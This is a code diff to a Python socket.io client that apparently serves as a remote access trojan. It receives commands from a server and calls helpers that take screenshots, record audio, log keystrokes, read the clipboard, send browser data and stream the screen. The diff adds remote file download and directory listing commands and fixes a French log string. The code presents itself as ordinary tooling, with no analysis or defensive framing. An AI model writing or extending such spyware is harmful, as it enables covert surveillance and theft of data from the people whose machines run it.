@@ -5,7 +5,8 @@ import time
 import socketio
 
 from database_utils import send_browser_data
-from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, gen_frames, get_clipboard_content
+from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
+    gen_frames, get_clipboard_content, list_dir
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -22,7 +23,7 @@ def connect():
 
 @sio.event
 def connect_error(data):
-    log_event(f"Connection echouée: {data}")
+    log_event(f"Connection échouée: {data}")
 
 
 @sio.event
@@ -34,6 +35,8 @@ def disconnect():
 def command(data):
     command = data.get('command')
     params = data.get('params', {})
+    duration = 0
+    file_path = ""
 
     if isinstance(params, str):
         try:
@@ -43,7 +46,10 @@ def command(data):
             return
 
     if isinstance(params, dict):
-        duration = int(params.get('duration', 10))
+        if 'duration' in params:
+            duration = int(params.get('duration', 10))
+        if 'file_path' in params:
+            file_path = params.get('file_path')
     else:
         duration = int(params)
 
@@ -57,11 +63,19 @@ def command(data):
         record_and_send_keyboard_log(duration, sio)
     elif command == 'papier':
         get_clipboard_content(sio)
+    elif command == 'download_file':
+        download_file(file_path, sio)
 
 
 @sio.event
 def start_stream():
     gen_frames(sio)
+
+
+@sio.event
+def list_directory(data):
+    directory = data.get('dir_path')
+    list_dir(directory, sio)
 
 
 def attempt_reconnect():
